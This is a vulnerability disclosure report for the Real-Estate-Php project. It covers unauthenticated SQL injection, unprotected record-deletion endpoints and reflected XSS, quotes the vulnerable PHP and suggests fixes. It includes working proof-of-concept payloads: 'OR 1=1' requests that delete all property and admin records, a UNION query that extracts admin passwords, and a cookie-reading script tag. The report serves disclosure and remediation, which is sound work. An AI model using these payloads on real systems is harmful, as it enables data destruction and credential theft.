# Vulnerability Report

## Summary
- **Title**: Unauthenticated SQL Injection and Record Deletion in Real-Estate-Php
- **Affected Version**: all versions (as of 2026-06-28)
- **CWE**: CWE-89 (SQL Injection), CWE-306 (Missing Authentication for Critical Function)
- **CVSS 3.1 Score**: 9.8 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Vendor**: suraj25809
- **Product**: Real-Estate-Php
- **Repository**: https://github.com/suraj25809/Real-Estate-Php

## Description

Real-Estate-Php contains multiple unauthenticated SQL injection vulnerabilities. The `id` parameter from `$_GET` or `$_REQUEST` is directly interpolated into SQL queries executed via `mysqli_query()` without any sanitization, escaping, parameterized queries, or authentication checks.

## Vulnerability Details

### 1. Unauthenticated SQL Injection + DELETE in submitpropertydelete.php

**Data flow (complete attack chain):**
- **Input**: `$_GET['id']` (line 3)
- **Sanitization**: None
- **SQL construction**: `"DELETE FROM property WHERE pid = {$pid}"` (line 4) — no quotes around `$pid`
- **Execution**: `mysqli_query($con, $sql)` (line 5)
- **Authentication**: None — no session check, no login verification

```php
// submitpropertydelete.php - COMPLETE FILE
<?php
include("config.php");
$pid = $_GET['id'];                                           // line 3: raw user input
$sql = "DELETE FROM property WHERE pid = {$pid}";             // line 4: no quotes, no escaping
$result = mysqli_query($con, $sql);                           // line 5: direct execution
```

**PoC**: `GET /submitpropertydelete.php?id=1 OR 1=1` — deletes ALL property records from the database.

### 2. Unauthenticated SQL Injection in stateproperty.php (public page)

```php
// stateproperty.php line 96-97
$state = $_REQUEST['id'];                                     // raw user input
$query = mysqli_query($con, "SELECT property.*, user.uname,user.utype,user.uimage
    FROM property,user WHERE property.uid=user.uid and state='$state'");
```

**PoC**: `GET /stateproperty.php?id=' UNION SELECT 1,2,3,4,password,6,7,8,9,10,11,12 FROM admin-- ` — extracts admin passwords.

### 3. Unauthenticated Admin Account Deletion

```php
// admin/admindelete.php - NO authentication check
$aid = $_GET['id'];                                           // raw user input
$sql = "DELETE FROM admin WHERE aid = {$aid}";                // no quotes, no escaping
$result = mysqli_query($con, $sql);
```

**PoC**: `GET /admin/admindelete.php?id=1 OR 1=1` — deletes ALL admin accounts without any authentication.

### 4. Reflected XSS across 12 files

`$_GET['msg']` is echoed without `htmlspecialchars()` in 12 files including `admin/aboutview.php:73`, `admin/adminlist.php:79`, `admin/propertyview.php:83`, `feature.php:95`, and others.

**PoC**: `GET /feature.php?msg=<script>alert(document.cookie)</script>`

## Impact

An unauthenticated attacker can:
1. **Extract all database contents** including user credentials, property data, and admin passwords via UNION-based SQL injection
2. **Delete arbitrary records** including all properties and all admin accounts via unprotected DELETE endpoints
3. **Steal user sessions** via reflected XSS across 12 pages

## Suggested Fix

1. Use prepared statements with `mysqli_prepare()` and `bind_param()` for all SQL queries
2. Add authentication checks (`session_start()` + login verification) to all admin and data-modification endpoints
3. Apply `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` to all user input rendered in HTML

## Credit
- Discovered by: goutou (https://github.com/goutouanquan)
- Contact: goutouanquan@163.com
